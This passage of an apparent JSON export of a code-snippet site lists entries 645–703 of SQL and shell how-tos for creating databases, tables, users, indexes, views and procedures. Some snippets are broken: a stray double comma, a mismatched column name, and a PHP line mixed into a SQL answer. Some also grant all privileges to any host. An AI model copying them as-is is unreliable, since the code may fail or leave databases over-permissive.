    "description": "CREATE TABLE DemoT (     Personid int NOT NULL AUTO_INCREMENT,     LastName varchar(111) NOT NULL,     FirstName varchar(111),     Age int,     PRIMARY KEY (Personid) );\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 645,
    "keyword": null,
    "link": null,
    "title": " create a unqie constraint mysql",
    "description": "ALTER TABLE contacts ADD CONSTRAINT contacts_unique UNIQUE (reference_number);\nALTER TABLE contacts ADD CONSTRAINT contact_name_unique UNIQUE (last_name, first_name);\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 646,
    "keyword": null,
    "link": null,
    "title": " create a view postgres",
    "description": "CREATE VIEW influencers AS   SELECT name, email, created_at   FROM users   WHERE follower_count > 1000;\nCREATE VIEW custom_view AS \t(SELECT ...)\n                                     CREATE OR REPLACE view_name  AS  query\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 647,
    "keyword": null,
    "link": null,
    "title": " create and attach user to a postgresql database",
    "description": "GRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\nsudo -u postgres psqlpostgres=# create database mydb;postgres=# create user myuser with encrypted password 'mypass';postgres=# grant all privileges on database mydb to myuser;\npsql=# grant all privileges on database <dbname> to <username>\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 648,
    "keyword": null,
    "link": null,
    "title": " create bdd mysql",
    "description": "CREATE DATABASE IF NOT EXISTS ma_base\n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 649,
    "keyword": null,
    "link": null,
    "title": " create column mysql terminal",
    "description": "alter table icecream add column flavor varchar (20) ; \n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 650,
    "keyword": null,
    "link": null,
    "title": " create column sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\n<?php       echo str_replace(\"john\", \"jack\", \"hello i am john\");    ?> \n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 651,
    "keyword": null,
    "link": null,
    "title": " create column sql server",
    "description": "ALTER TABLE table_name ADD column_name datatype;\n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 652,
    "keyword": null,
    "link": null,
    "title": " create database in mysql",
    "description": "CREATE DATABASE `mydb`;  CREATE TABLE `my_table` ( \tmy_table_id INT AUTO_INCREMENT,     my_table_name VARCHAR(30) NOT NULL,     my_foreign_key INT NOT NULL,     my_tb_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,   \tmy_tb_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, ,     # Any other properties here     PRIMARY KEY(my_table_id),     CONSTRAINT fk_name_of_parent_table     FOREIGN KEY(my_foreign_key) REFERENCES parent_table(parent_table_column) );  SHOW DATABASES; \nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\nCREATE DATABASE dbname;\nmysql> CREATE DATABASE databaseName;\nThe CREATE DATABASE statement is used to create a new SQL/MySQL database.  Syntax CREATE DATABASE databasename;  CREATE DATABASE Example The following SQL statement creates a database called \"testDB\":  Example CREATE DATABASE testDB;\nmysql -u username -p CREATE DATABASE dbname;\n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 653,
    "keyword": null,
    "link": null,
    "title": " create database mysql",
    "description": "CREATE DATABASE `mydb`;  CREATE TABLE `my_table` ( \tmy_table_id INT AUTO_INCREMENT,     my_table_name VARCHAR(30) NOT NULL,     my_foreign_key INT NOT NULL,     my_tb_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,   \tmy_tb_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, ,     # Any other properties here     PRIMARY KEY(my_table_id),     CONSTRAINT fk_name_of_parent_table     FOREIGN KEY(my_foreign_key) REFERENCES parent_table(parent_table_column) );  SHOW DATABASES; \nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\nCREATE DATABASE dbname;\nmysql> CREATE DATABASE databaseName;\nThe CREATE DATABASE statement is used to create a new SQL/MySQL database.  Syntax CREATE DATABASE databasename;  CREATE DATABASE Example The following SQL statement creates a database called \"testDB\":  Example CREATE DATABASE testDB;\nmysql -u username -p CREATE DATABASE dbname;\n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 654,
    "keyword": null,
    "link": null,
    "title": " create database mysql utf8",
    "description": "CREATE DATABASE mydatabase CHARACTER SET utf8 COLLATE utf8_general_ci;\nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;\nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 655,
    "keyword": null,
    "link": null,
    "title": " create database postgres",
    "description": "sudo -u postgres psql postgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\nCREATE DATABASE dbname; \ncreatedb -h localhost -p 5432 -U postgres testdb password ******\ncreatedb sammy \n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 656,
    "keyword": null,
    "link": null,
    "title": " create database sql",
    "description": "CREATE DATABASE databasename;\nCREATE TABLE example (     id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,     username VARCHAR(50) NOT NULL UNIQUE,     password VARCHAR(255) NOT NULL,     created_at DATETIME DEFAULT CURRENT_TIMESTAMP  );\nCREATE table songs (   id INTEGER PRIMARY KEY AUTOINCREMENT,   title TEXT,   artist TEXT,   mood TEXT,   duration INTEGER,   released INTEGER); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Bohemian Rhapsody\", \"Queen\", \"epic\", 60, 1975); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Let it go\", \"Idina Menzel\", \"epic\", 227, 2013); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will survive\", \"Gloria Gaynor\", \"epic\", 198, 1978); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Twist and Shout\", \"The Beatles\", \"happy\", 152, 1963); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"La Bamba\", \"Ritchie Valens\", \"happy\", 166, 1958); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will always love you\", \"Whitney Houston\", \"epic\", 273, 1992); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Sweet Caroline\", \"Neil Diamond\", \"happy\", 201, 1969); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Call me maybe\", \"Carly Rae Jepsen\", \"happy\", 193, 2011);    SELECT * FROM songs;\nCreates a new database. Example: Creates a new database named &lsquo;websitesetup&rsquo;. CREATE DATABASE websitesetup;\nSHOW DATABASES;  DROP DATABASE testDB;  USE DatabaseName;    SQL> CREATE TABLE CUSTOMERS(    ID   INT              NOT NULL,    NAME VARCHAR (20)     NOT NULL,    AGE  INT              NOT NULL,    ADDRESS  CHAR (25) ,    SALARY   DECIMAL (18, 2),           PRIMARY KEY (ID) );  DESC CUSTOMERS;\nCreate DATABASE HP; \n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 657,
    "keyword": null,
    "link": null,
    "title": " create database store",
    "description": "CREATE DATABASE movies; \n",
    "reg_date": "2021-10-12T09:54:40.000Z"
  },
  {
    "id": 658,
    "keyword": null,
    "link": null,
    "title": " create database terminal mysql",
    "description": "CREATE DATABASE dbname;\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 659,
    "keyword": null,
    "link": null,
    "title": " create databaste mysql",
    "description": "mysql> CREATE DATABASE databaseName;\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 660,
    "keyword": null,
    "link": null,
    "title": " create db table",
    "description": "CREATE TABLE table_name (     column1 datatype,     column2 datatype,     column3 datatype,    .... ); \n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 661,
    "keyword": null,
    "link": null,
    "title": " create duplicate table postgres",
    "description": "create table dupe_users as (select * from users);  -- The `with no data` here means structure only, no actual rows create table dupe_users as (select * from users) with no data;\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 662,
    "keyword": null,
    "link": null,
    "title": " create email address from first and last name in sql",
    "description": "# NB: This creates email addresses with the format # first_name.last_name@company_name.com # Name of table = names_table # Name of column containing names = full_name # Simply change the table and column name to what corresponds with your dataset  WITH temp_table AS ( \tSELECT LEFT(full_name, STRPOS(primary_poc, ' ') -1 ) AS first_name,     \t\t\tRIGHT(full_name, LENGTH(primary_poc) - STRPOS(primary_poc, ' ')) AS last_name, name \tFROM names_table)  SELECT CONCAT(first_name, '.', last_name, '@', 'company_name.com') FROM temp_table;\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 663,
    "keyword": null,
    "link": null,
    "title": " create engine sqlalchemy with parsed url sql server",
    "description": "import urllib params = urllib.parse.quote_plus(\"DRIVER={SQL Server Native Client 10.0};SERVER=dagger;DATABASE=test;UID=user;PWD=password\")  engine = create_engine(\"mssql+pyodbc:///?odbc_connect=%s\" % params)\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 664,
    "keyword": null,
    "link": null,
    "title": " create fulltext index mysql",
    "description": "-- examble to create fulltext index on posts table on blog  CREATE FULLTEXT INDEX IF NOT EXISTS idx_title_body ON     posts(title, body);      SELECT     * FROM     posts WHERE     MATCH(title, body) AGAINST(\"search words\" IN BOOLEAN MODE);\nCREATE FULLTEXT INDEX IF NOT EXISTS idx_col1_col2 ON     tableName(col1, col2);      SELECT     * FROM     tableName WHERE     MATCH(col1, col2) AGAINST(\"search words\");\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 665,
    "keyword": null,
    "link": null,
    "title": " create function in postgresql",
    "description": "create [or replace] function function_name(param_list)    returns return_type     language plpgsql as $$ declare  -- variable declaration begin  -- logic end; $$\npostgres=# Create or replace function fun1(n int) returns int   as  $$  Begin  Insert into test values (n,'2019-11-26');  Return 1;  End;  $$  Language 'plpgsql';  CREATE FUNCTION  postgres=# \n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 666,
    "keyword": null,
    "link": null,
    "title": " create index concurrently postgres",
    "description": "create index concurrently [index_name] on [table_name]([column_name]);\n",
    "reg_date": "2021-10-12T09:54:41.000Z"
  },
  {
    "id": 667,
    "keyword": null,
    "link": null,
    "title": " create index mysql",
    "description": "# index_name will identify your index for future reference CREATE INDEX index_name ON table_name (column_name);\ncreate index your_index_name on your_table_name(your_column_name) using HASH; or create index your_index_name on your_table_name(your_column_name) using BTREE;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 668,
    "keyword": null,
    "link": null,
    "title": " create index mysql cli",
    "description": "# index_name will identify your index for future reference CREATE INDEX index_name ON table_name (column_name);\ncreate index your_index_name on your_table_name(your_column_name) using HASH; or create index your_index_name on your_table_name(your_column_name) using BTREE;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 669,
    "keyword": null,
    "link": null,
    "title": " create index sql server syntax",
    "description": "CREATE INDEX index_name ON tableName (tableColumn);\n-- Create a nonclustered index on a table or view CREATE INDEX i1 ON t1 (col1);  -- Create a clustered index on a table and use a 3-part name for the table CREATE CLUSTERED INDEX i1 ON d1.s1.t1 (col1);  -- Syntax for SQL Server and Azure SQL Database -- Create a nonclustered index with a unique constraint -- on 3 columns and specify the sort order for each column CREATE UNIQUE INDEX i1 ON t1 (col1 DESC, col2 ASC, col3 DESC); \n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 670,
    "keyword": null,
    "link": null,
    "title": " create login sql server",
    "description": "CREATE LOGIN <login_name> WITH PASSWORD = '<enterStrongPasswordHere>'; GO \n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 671,
    "keyword": null,
    "link": null,
    "title": " create mysql database",
    "description": "sudo -u postgres psql postgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\nCREATE DATABASE `mydb`;  CREATE TABLE `my_table` ( \tmy_table_id INT AUTO_INCREMENT,     my_table_name VARCHAR(30) NOT NULL,     my_foreign_key INT NOT NULL,     my_tb_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,   \tmy_tb_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, ,     # Any other properties here     PRIMARY KEY(my_table_id),     CONSTRAINT fk_name_of_parent_table     FOREIGN KEY(my_foreign_key) REFERENCES parent_table(parent_table_column) );  SHOW DATABASES; \nCREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;\nCREATE DATABASE dbname;\nmysql> CREATE DATABASE databaseName;\nmysql -u username -p CREATE DATABASE dbname;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 672,
    "keyword": null,
    "link": null,
    "title": " create mysql user",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\n# First Login mysql shell.. sudo mysql -u root -p  CREATE USER 'username'@'localhost' IDENTIFIED BY 'P4ssW0rd'; GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost'; FLUSH PRIVILEGES;\n#in the case below, your username is dbuser #and we assume that the mysql db is located in the same server or box from where you want to access it from #after the IDENTIFIED BY and within the single qoute (') you you should replace 'complexPassword' with a password your desire CREATE USER 'dbuser'@'localhost' IDENTIFIED BY 'complexPassword';  #we assume that the name of your database is db_name #the command below grants the user you created with privilege to only database db_name #if your want dbuser to have access to all database the replace db_name with * GRANT ALL PRIVILEGES ON db_name . * TO 'dbuser'@'localhost';  #the command below reloads the privileges of mysql with your new user privileges FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'%' IDENTIFIED BY 'user_password'; GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'%'; SHOW GRANTS FOR 'newuser'@'%'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 673,
    "keyword": null,
    "link": null,
    "title": " create mysql user on all hosts",
    "description": "CREATE USER 'newuser'@'%' IDENTIFIED BY 'user_password'; GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'%'; SHOW GRANTS FOR 'newuser'@'%'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 674,
    "keyword": null,
    "link": null,
    "title": " create new databse sql",
    "description": "CREATE DATABASE databasename;\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 675,
    "keyword": null,
    "link": null,
    "title": " create new index takes long time postgresql",
    "description": "Create index with concurrency :  CREATE INDEX CONCURRENTLY users_name_idx ON users(name);\n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 676,
    "keyword": null,
    "link": null,
    "title": " create new table from existing table with data in sql server",
    "description": "INSERT INTO new_table SELECT * FROM old_table \nCREATE TABLE florist  AS SELECT   * FROM product WHERE category = &rsquo;flower&rsquo;; \n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 677,
    "keyword": null,
    "link": null,
    "title": " create new table from old table",
    "description": "Select * into new_table  from  old_table  \n",
    "reg_date": "2021-10-12T09:54:42.000Z"
  },
  {
    "id": 678,
    "keyword": null,
    "link": null,
    "title": " create new table from old table with data",
    "description": "Select * into new_table  from  old_table  \n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 679,
    "keyword": null,
    "link": null,
    "title": " create new table pl sql",
    "description": "CREATE TABLE customers ( customer_id number(10) NOT NULL,   customer_name varchar2(50) NOT NULL,   city varchar2(50) );\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 680,
    "keyword": null,
    "link": null,
    "title": " create new table plsql",
    "description": "CREATE TABLE customers ( customer_id number(10) NOT NULL,   customer_name varchar2(50) NOT NULL,   city varchar2(50) );\nCREATE TABLE table_name (    column1 datatype [ NULL | NOT NULL ],   column2 datatype [ NULL | NOT NULL ],   ...   column_n datatype [ NULL | NOT NULL ] );\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 681,
    "keyword": null,
    "link": null,
    "title": " create new user in postgres",
    "description": "sudo -u postgres psql postgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\nCREATE DATABASE yourdbname;CREATE USER youruser WITH ENCRYPTED PASSWORD 'yourpass';GRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\nCREATE USER visualscrapy WITH PASSWORD '123456'; # it will create the new user in postgres\n$ sudo -u postgres createuser <username>\n$ sudo -u postgres createdb <dbname>\ndropuser username\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 682,
    "keyword": null,
    "link": null,
    "title": " create pivot table in sql",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\nPIVOT \t(SUM(TotalDue) \tFOR Qyr      IN ([2013 Q1], [2013 Q2], [2013 Q3], [2013 Q4]) \t) AS PivotTable\nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales  from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount  from tblAgentsSales\nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount from tblAgentsSales\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 683,
    "keyword": null,
    "link": null,
    "title": " create procedure sql",
    "description": "CREATE PROCEDURE SelectAllCustomers @City nvarchar(30), @PostalCode nvarchar(10) AS SELECT * FROM Customers WHERE City = @City AND PostalCode = @PostalCode GO;\nIF OBJECT_ID ( 'Production.uspGetList', 'P' ) IS NOT NULL        DROP PROCEDURE Production.uspGetList;   GO   CREATE PROCEDURE Production.uspGetList @Product varchar(40)        , @MaxPrice money        , @ComparePrice money OUTPUT       , @ListPrice money OUT   AS       SET NOCOUNT ON;       SELECT p.[Name] AS Product, p.ListPrice AS 'List Price'       FROM Production.Product AS p       JOIN Production.ProductSubcategory AS s          ON p.ProductSubcategoryID = s.ProductSubcategoryID       WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice;   -- Populate the output variable @ListPprice.   SET @ListPrice = (SELECT MAX(p.ListPrice)           FROM Production.Product AS p           JOIN  Production.ProductSubcategory AS s              ON p.ProductSubcategoryID = s.ProductSubcategoryID           WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice);   -- Populate the output variable @compareprice.   SET @ComparePrice = @MaxPrice;   GO   \n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 684,
    "keyword": null,
    "link": null,
    "title": " create rails app with mysql database",
    "description": "rails new app_name -d mysql\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 685,
    "keyword": null,
    "link": null,
    "title": " create role oracle 12c",
    "description": "-- CREATE ROLE role_name [IDENTIFIED BY password] [NOT IDENTIFIED] CREATE ROLE role_name; GRANT CREATE SESSION, ALTER SESSION TO role_name; GRANT SELECT, INSERT, DELETE, UPDATE ON table_name TO role_name; GRANT EXECUTE ON proc_name TO role_name; -- Grant role to user GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 686,
    "keyword": null,
    "link": null,
    "title": " create row number in sql",
    "description": "SELECT t.A, t.B, t.C, ROW_NUMBER() OVER (ORDER BY t.A) as newId   FROM dbo.tableZ AS t   ORDER BY t.A;\n-- Uses AdventureWorks      SELECT ROW_NUMBER() OVER(ORDER BY SUM(SalesAmountQuota) DESC)      AS RowNumber,       FirstName, LastName,        CONVERT(varchar(13), SUM(SalesAmountQuota),1) AS SalesQuota    FROM dbo.DimEmployee AS e   INNER JOIN dbo.FactSalesQuota AS sq       ON e.EmployeeKey = sq.EmployeeKey   WHERE e.SalesPersonFlag = 1   GROUP BY LastName, FirstName;   \nSELECT     ROW_NUMBER() OVER (  ORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers; \n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 687,
    "keyword": null,
    "link": null,
    "title": " create sample data postgresql",
    "description": "insert into towns (     code, article, name, department ) select     left(md5(i::text), 10),     md5(random()::text),     md5(random()::text),     left(md5(random()::text), 4) from generate_series(1, 1000000) s(i) \n",
    "reg_date": "2021-10-12T09:54:43.000Z"
  },
  {
    "id": 688,
    "keyword": null,
    "link": null,
    "title": " create schema oracle sql 19c",
    "description": "CREATE USER smith IDENTIFIED BY password;\nGRANT CREATE TABLE TO smith;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 689,
    "keyword": null,
    "link": null,
    "title": " create schema postgres",
    "description": " CREATE DATABASE foo;  \\connect foo;  CREATE SCHEMA yourschema; \nPostgreSQL Create Schema  CREATE SCHEMA [IF NOT EXISTS] schema_name;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 690,
    "keyword": null,
    "link": null,
    "title": " create schema sql server",
    "description": "CREATE SCHEMA my_schema; CREATE SCHEMA my_schema AUTHORIZATION my_owner;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 691,
    "keyword": null,
    "link": null,
    "title": " create select stored procedure in sql server",
    "description": "CREATE PROCEDURE sp_getRaces AS BEGIN  SELECT * FROM dbo.Races END ;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 692,
    "keyword": null,
    "link": null,
    "title": " create sequence if not exists postgres",
    "description": "CREATE SEQUENCE IF NOT EXISTS tbl_field_seq;\nIF EXISTS (SELECT 0 FROM pg_class where relname = '<my sequence name here>' ) THEN   --stuff here END IF; \n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 693,
    "keyword": null,
    "link": null,
    "title": " create sequence in oracle 12c",
    "description": "CREATE SEQUENCE schema.seq_name  \tMINVALUE 1      INCREMENT BY 1      START WITH 1      CACHE 1000      ORDER; GRANT SELECT ON schema.seq_name TO user_name;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 694,
    "keyword": null,
    "link": null,
    "title": " create sequence postgres",
    "description": "CREATE SEQUENCE mysequence INCREMENT 5 START 100;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 695,
    "keyword": null,
    "link": null,
    "title": " create sequence sql",
    "description": "CREATE SEQUENCE schema.seq_name  \tMINVALUE 1      INCREMENT BY 1      START WITH 1      CACHE 1000      ORDER; GRANT SELECT ON schema.seq_name TO user_name;\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 696,
    "keyword": null,
    "link": null,
    "title": " create sqlite database and table in python",
    "description": "                                                     import sqlite3 from sqlite3 import Error   def create_connection(db_file):     \"\"\" create a database connection to the SQLite database         specified by db_file     :param db_file: database file     :return: Connection object or None     \"\"\"     conn = None     try:         conn = sqlite3.connect(db_file)         return conn     except Error as e:         print(e)      return conn   def create_table(conn, create_table_sql):     \"\"\" create a table from the create_table_sql statement     :param conn: Connection object     :param create_table_sql: a CREATE TABLE statement     :return:     \"\"\"     try:         c = conn.cursor()         c.execute(create_table_sql)     except Error as e:         print(e)   def main():     database = r\"C:\\sqlite\\db\\pythonsqlite.db\"      sql_create_projects_table = \"\"\" CREATE TABLE IF NOT EXISTS projects (                                         id integer PRIMARY KEY,                                         name text NOT NULL,                                         begin_date text,                                         end_date text                                     ); \"\"\"      sql_create_tasks_table = \"\"\"CREATE TABLE IF NOT EXISTS tasks (                                     id integer PRIMARY KEY,                                     name text NOT NULL,                                     priority integer,                                     status_id integer NOT NULL,                                     project_id integer NOT NULL,                                     begin_date text NOT NULL,                                     end_date text NOT NULL,                                     FOREIGN KEY (project_id) REFERENCES projects (id)                                 );\"\"\"      # create a database connection     conn = create_connection(database)      # create tables     if conn is not None:         # create projects table         create_table(conn, sql_create_projects_table)          # create tasks table         create_table(conn, sql_create_tasks_table)     else:         print(\"Error! cannot create the database connection.\")   if __name__ == '__main__':     main()Code language: Python (python)\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 697,
    "keyword": null,
    "link": null,
    "title": " create sqlite database in laravel",
    "description": "touch database/database.sqlite\n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 698,
    "keyword": null,
    "link": null,
    "title": " create stored procedure for error handling in msq server",
    "description": " // errror handeling in sql server               CREATE PROC usp_divide(     @a decimal,     @b decimal,     @c decimal output ) AS BEGIN     BEGIN TRY         SET @c = @a / @b;     END TRY     BEGIN CATCH         SELECT               ERROR_NUMBER() AS ErrorNumber               ,ERROR_SEVERITY() AS ErrorSeverity               ,ERROR_STATE() AS ErrorState               ,ERROR_PROCEDURE() AS ErrorProcedure               ,ERROR_LINE() AS ErrorLine               ,ERROR_MESSAGE() AS ErrorMessage;       END CATCH END; GO \n",
    "reg_date": "2021-10-12T09:54:44.000Z"
  },
  {
    "id": 699,
    "keyword": null,
    "link": null,
    "title": " create stored procedure mysql",
    "description": "-- MySQL  -- example DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE select_employees() BEGIN \tselect *  \tfrom employees  \tlimit 1000; -- Use the ; symbol within the procedure END$$  DELIMITER ; -- Resets the delimiter  /* syntax: DELIMITER $$ -- Changes delimiter to $$ so can use ; within the procedure CREATE PROCEDURE <Your-procedure-name>(<argument1><argument2>...<argumentN>) BEGIN \t<Code-that-stored-procedure-executes>; -- Use the ; symbol within the procedure END$$ DELIMITER ; -- Resets the delimiter */\nDELIMITER $$  CREATE PROCEDURE GetCustomers() BEGIN \tSELECT  \t\tcustomerName,  \t\tcity,  \t\tstate,  \t\tpostalCode,  \t\tcountry \tFROM \t\tcustomers \tORDER BY customerName;     END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetCustomers(); \nDELIMITER $$  CREATE PROCEDURE GetAllProducts() BEGIN \tSELECT *  FROM products; END $$  DELIMITER ;   -- Once you save the stored procedure, you can invoke it by using the CALL statement:  CALL GetAllProducts(); \n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 700,
    "keyword": null,
    "link": null,
    "title": " create table if not exist in sqlite",
    "description": "CREATE TABLE IF NOT EXISTS some_table (id INTEGER PRIMARY KEY AUTOINCREMENT, ...);\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 701,
    "keyword": null,
    "link": null,
    "title": " create table if not exists sql",
    "description": "CREATE TABLE IF NOT EXISTS  > CREATE TABLE IF NOT EXISTS TEAMS > (TEAMNO      INTEGER NOT NULL PRIMARY KEY, > EmployeeNO    INTEGER NOT NULL, > DIVISION    CHAR(6) NOT NULL); \n CREATE TABLE [IF NOT EXISTS] [schema_name].table_name ( \tcolumn_1 data_type PRIMARY KEY,    \tcolumn_2 data_type NOT NULL, \tcolumn_3 data_type DEFAULT 0, \ttable_constraints ) [WITHOUT ROWID];\nCREATE TABLE IF NOT EXISTS [schema_name].table_name (...);\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 702,
    "keyword": null,
    "link": null,
    "title": " create table in microsoft sql server",
    "description": "CREATE TABLE [database_name.][schema_name.]table_name (     pk_column data_type PRIMARY KEY,     column_1 data_type NOT NULL,     column_2 data_type,     ...,     table_constraints );\n",
    "reg_date": "2021-10-12T09:54:45.000Z"
  },
  {
    "id": 703,
    "keyword": null,
    "link": null,
    "title": " create table in mysql",
